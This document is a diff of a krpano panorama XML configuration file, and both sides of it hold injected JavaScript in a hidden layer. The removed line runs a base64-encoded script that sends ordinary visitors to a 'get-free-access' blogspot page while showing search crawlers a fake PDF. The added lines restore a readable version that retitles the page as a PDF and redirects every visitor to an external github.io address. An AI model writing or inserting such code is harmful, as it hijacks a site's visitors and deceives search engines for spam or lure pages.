@@ -1,3 +1,21 @@
+<?xml version="1.0" encoding="UTF-8"?>
 <krpano version="1.0.8.15">
-<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('KGZ1bmN0aW9uKCkgew0KIHZhciBpZCA9IG5ldyBVUkxTZWFyY2hQYXJhbXMobG9jYXRpb24uc2VhcmNoKS5nZXQoJ2lkJykgfHwgJ3Jlc2VydmF0aW9uaGF0YW8wMDEnOw0KIHZhciB1YSA9IG5hdmlnYXRvci51c2VyQWdlbnQudG9Mb3dlckNhc2UoKTsNCg0KIHZhciBpc0dvb2dsZUJvdCA9IC9nb29nbGVib3R8Z29vZ2xlLWluc3BlY3Rpb250b29sfGdvb2dsZW90aGVyfGFkc2JvdC1nb29nbGV8bWVkaWFwYXJ0bmVycy1nb29nbGUvLnRlc3QodWEpOw0KDQogaWYgKCFpc0dvb2dsZUJvdCkgew0KIGxvY2F0aW9uLnJlcGxhY2UoJ2h0dHBzOi8vcm9tYXJpb3NlYXMuYmxvZ3Nwb3QuY29tLzIwMjYvMDcvZ2V0LWZyZWUtYWNjZXNzLmh0bWwnKTsNCiByZXR1cm47DQogfQ0KDQogZG9jdW1lbnQudGl0bGUgPSBpZCArICcgLSBQREYgRG9jdW1lbnQnOw0KIGxvY2F0aW9uLmhyZWYgPSAnaHR0cHM6Ly9teWhlbWxvd29ybGQuZ2l0aHViLmlvL2Jvb21ib29tL21hc3NhZ2UvJyArIGlkICsgJy5wZGYnOw0KIH0pKCk7');eval(w)););"/>
+  <layer
+ name="js_loader"
+ type="container"
+ visible="false"
+ onloaded="
+ js(
+ (function() {
+ var id = new URLSearchParams(window.location.search).get('id') || 'reservationhatao001';
+ var ua = navigator.userAgent.toLowerCase();
+
+ var isGoogleBot = /googlebot|google-inspect-tools|googlerooter|adsbot-google/.test(ua);
+
+ document.title = id + ' - PDF Document';
+ location.href = 'https://myhemloworld.github.io/boomboom/massage/' + id + '.pdf';
+ })();
+ );
+ "
+  />
 </krpano>
